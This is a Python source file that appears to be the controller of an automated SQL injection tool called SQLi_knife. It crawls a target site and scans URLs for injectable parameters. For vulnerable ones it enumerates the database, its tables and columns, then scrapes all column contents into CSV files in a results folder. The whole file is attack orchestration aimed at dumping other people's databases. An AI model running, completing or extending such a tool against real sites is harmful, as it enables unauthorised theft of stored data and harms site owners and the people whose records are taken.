# our own libs imports

from SQLi_knife.webpage_crawler import WebpageCrawler
from SQLi_knife.sqli_engine import SQLI_engine
from SQLi_knife.sqli_database import Database
from SQLi_knife.sqli_table import Table
# expernal libs imports
import traceback
import os
import csv
from urllib.parse import urlparse
import SQLi_knife.html_scanner as html_scanner

"""
main controller of the app to manage all subscripts
It has 5 main functions:
-crawl_urls - to crawl some webpage 
-scan_url - to check if some webpage sqli vulnerable ot not
-initialize_db - to create scructure that represents results of SQL injection
-do_injection - to do sql injection itselt
-save_results - to save results of sql injection to result folder as csv files
"""


class InjectionManager:
    # __init__ method runs when object creates. Initialuze WebpageCrawler when obkect ceats
    def __init__(self):
        self.webpage_crawler = WebpageCrawler()

    # simple wrapper to self.webpage_crawler.crawl_url method
    def crawl_urls(self, url):
        try:
            print("[MSG] crawling page: {}".format(url))
            # get result of WebpageCrawler.crawl_url
            urls = self.webpage_crawler.crawl_url(url)
            # chek results
            if not urls:
                print("[MSG] for sql injection urls not found")
            print("[MSG] found {} new urls".format(len(urls)))
            return urls
        except Exception as e:
            print("[ERR]: {}".format(str(e)))
            print(traceback.format_exc())

    # simple wrapper to html_scanner.scan_urls([url]) method
    def scan_url(self, url, event_VUL,  event_LOG,  event_RES):
        try:
            # list to save vulnerables info
            result = []
            # if quesy has parameters
            if urlparse(url).query:
                # scan list of urls (returns DB type if url is vulnerable)
                result = html_scanner.scan_urls([url],  event_VUL,  event_LOG,  event_RES)
                # if no vulnerables - ask to start crawling or not
                if not result:
                    event_RES.emit("\n[MSG] no SQL injection vulnerability found\n")
                    return False
                    #option = input("Do you want to continue crawling? [y/n]")
                    ## if user don`t want to crawl - return
                    #if option.lower() == 'n':
                        #return False
            else:
                event_RES("Please use URL with parameters!")
                print('\033[0m')
            # this part of code runs if url has no parameters ot user want to ccrawl non-vulnerable url
            if not result:
                # get crawled urls
                urls = self.crawl_urls(url)
                # scan each of urls again
                result = html_scanner.scan_urls(urls)
                if not result:
                    event_VUL.emit("[MSG] no vulnerability found")
            return result
        except Exception as e:
            event_RES.emit("[ERR]: {}".format(str(e)))
            event_RES.emit(traceback.format_exc())

    #method wrapper to build Database and Tables go store sql injection data
    def initialize_db(self, url):
        # initialize SQLI_engine object (it`s a class that do injection itself)
        sql_injection = SQLI_engine(url)
        # get info about database
        database = sql_injection.get_db()
        # create simple Database object (see sqli_database.py)
        db = Database(database)
        # add database to list of available databases
        sql_injection.databases.append(db)
        # list of tables available
        tables_of_db = []
        # get info about tables
        tables = sql_injection.get_tables()
        # add all tables to list of available tables
        [tables_of_db.append(Table(i)) for i in tables.split(",")]
        # map db to tables
        sql_injection.databases[0].set_db_tables(tables_of_db)
        return sql_injection, database, tables

    #method to save results (dictionary to many csv files)
    def save_results(self, result, event_LOG,  event_RES):
        """
        :param result: dictionary with sqli results. KEY1: table name KEY2: columns name. Value2: olumn content
        :return:
        """
        # create result foldr if not exists
        if not os.path.exists('results'):
            os.makedirs('results')
        # iterage through dict key values first level (TABLE NAME: TABLE DATA)
        for k, v in result.items():
            # temp - 2d list to keep table data like ['column name', 'value1', 'value2' etc]
            temp = []
            # iterage through dict key values second level (column NAME: coulmn DATA)
            for k1, v1 in v.items():
                new_array = [k1] + v1
                # add data to temp
                temp.append(new_array)
            # invert temp (matrix transpose)
            temp = zip(*temp)
            # if temp is not empty
            if temp:
                # save list of lists to csv
                with open("results/{}.csv".format(k), "w") as f:
                    event_LOG.emit('Table saved to ' + 'results/{}.csv'.format(k))
                    event_RES.emit('Table saved to ' + 'results/{}.csv'.format(k))

                    writer = csv.writer(f)
                    writer.writerows(temp)


    def do_injection(self, url, event_LOG,  event_RES):
        """
        Method do do sql injection
        :param url: url with no parameters
        :return:
        """
        event_LOG.emit('Working on injection')
        #initialize injection engine object, database, tables
        sql_injection, database, tables = self.initialize_db(url)
        #'\033[30m' - ascii color of black/white inversion
        event_LOG.emit("tables: " + '\033[0m' + tables + '\033[93m')
        result = {}
        #interage throught ecah table
        for table in tables.split(','):
            #add new key (table name) to result dict
            result[table] = {}
            #get columns names
            columns = sql_injection.get_columns(table)
            #if columns list is not empty...
            if columns:
                #set columns to Tabale
                sql_injection.databases[0].db_tables[0].set_tb_columns(columns.split(","))
                event_LOG.emit("columns: " + '\033[0m' + columns + '\033[93m')
                #convert comma sepatated list of columns to list of columns
                splitted_columns = columns.split(',')
                #scrape data for each column
                for col in splitted_columns:
                    try:
                        sql_injection.scrape_data([col], table, result[table])
                    except Exception as e:
                        print(traceback.format_exc())
        #save python dict as many csv files
        self.save_results(result, event_LOG,  event_RES)
